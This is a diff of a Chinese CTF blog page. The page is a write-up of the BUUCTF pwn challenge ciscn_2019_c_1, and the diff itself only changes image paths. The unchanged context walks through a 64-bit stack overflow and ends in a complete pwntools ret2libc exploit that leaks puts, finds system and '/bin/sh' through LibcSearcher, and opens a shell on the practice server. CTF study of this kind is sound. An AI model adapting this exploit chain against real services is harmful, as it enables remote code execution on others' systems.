@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="中级ROP&#x2F;ret2libc&#x2F;64位程序">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/1.png">
-<meta property="og:image" content="http://example.com/2.png">
-<meta property="og:image" content="http://example.com/3.png">
-<meta property="og:image" content="http://example.com/4.png">
-<meta property="og:image" content="http://example.com/6.png">
-<meta property="og:image" content="http://example.com/5.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/1.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/2.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/3.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/4.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/6.png">
+<meta property="og:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/5.png">
 <meta property="article:published_time" content="2021-03-27T13:55:04.000Z">
 <meta property="article:modified_time" content="2021-04-20T12:35:28.057Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/1.png">
+<meta name="twitter:image" content="http://example.com/2021/03/27/ciscn-2019-c-1/1.png">
   
   
   
@@ -285,22 +285,22 @@
                 <p>大概有一周这样没做题了，这周主要在学习基础一点的理论，学校课业也慢慢变多了（特别是程序设计作业，杀了我吧），挤了一点时间读wiki的ROP部分，被有bug和文不对题的题目折磨了好些时间，里面有些概念也需要另外找资料补充，就看得贼慢，一个下午才搞懂一两个知识点，不过总归还是有收获的，慢慢来就都能学会的orz。</p>
 <p>然后wiki上的题直接复现感觉有很多疑点，包括一些偏移地址的知识和脚本的一些功能都搞不太清楚，就还是先上buuctf做下题。</p>
 <p>先checksec嘛，是64位的！</p>
-<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后就康康ida</p>
-<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>显然，输入1进入encrypt函数，然后就能在里面发现一个gets（），这里会将输入的payload加密，注意到v0，可以在payload的开头放一个\0，就能绕过加密。网上也有wp说经过两次异或就能变回原数据，但是明显\0更加省心。</p>
-<p><img src="/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/3.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里我用cyclic计算偏移地址的时候，奇怪地报错了（关于一报错就手无足措这件事），就通过s【rsp+0h】【rbp-50h】算出偏移量应该是50*16+8&#x3D;88，第一个字符应该是\0，那么填充的垃圾数据应该是87个。接下来因为没有system和&#x2F;bin&#x2F;sh，就得用ret2libc，又因为是64位程序，参数储存在寄存器中，就应该找到gadget，这里用的是ret2csu。</p>
-<p><img src="/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里先调用一次loc_400c76，再调用一次loc_400c60，就能先依次pop，使rdx&#x3D;r13，rsi&#x3D;r14，edi&#x3D;r15d（只有低位8字节噢），然后会call[r12+rbx*8]这个地址指向的函数地址，因此要让这个地址不指向任一个地址，才能跳转到后面，cmp rbx,rbp，因此要让rbx&#x3D;rbp也就是pop的时候让rbp&#x3D;rbx+1，紧接再次把需要的数据pop进寄存器里，就能实现存储参数进寄存器，就能顺利调用需要的函数。</p>
 <p>……</p>
 <p>以上是第一条思路，紧接着就想到了明明可以直接使用ROPgadget &#x3D;-&#x3D;我人傻了</p>
 <p>然后就找一下</p>
 <p>64位程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>
 <p>puts只有一个参数，就找rdi就行，比起csu直接难度跳水orz</p>
-<p><img src="/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/6.png" srcset="/img/loading.gif" lazyload></p>
 <p>接着是找puts的plt地址，泄露got地址找到匹配的libc版本，然后就能通过libc找到system和&#x2F;bin&#x2F;sh，ida就能找到</p>
-<p><img src="/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/03/27/ciscn-2019-c-1/5.png" srcset="/img/loading.gif" lazyload></p>
 <p>那么就能写exp啦</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>content = 0<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>ret = 0x4006b9<br>elf = ELF(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br><br>pop_rdi_ret = 0x400c83<br><br><br>def main():<br>	<span class="hljs-keyword">if</span> content == 1:<br>		p = process(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br>	<span class="hljs-keyword">else</span>:<br>		p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,27421)<br><br>	payload = b<span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>	payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>	#<span class="hljs-built_in">print</span>(payload)<br><br>	p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>	p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>	p.recvline()<br>	puts_addr = u64(p.recv(7)[:-1].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>	<span class="hljs-built_in">print</span>(puts_addr)<br><br>	libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br><br>	libc_base   = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>	system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>	binsh_addr  = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>	payload = <span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>	payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>	p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>	p.interactive()<br><br>main()<br></code></pre></td></tr></table></figure>
 
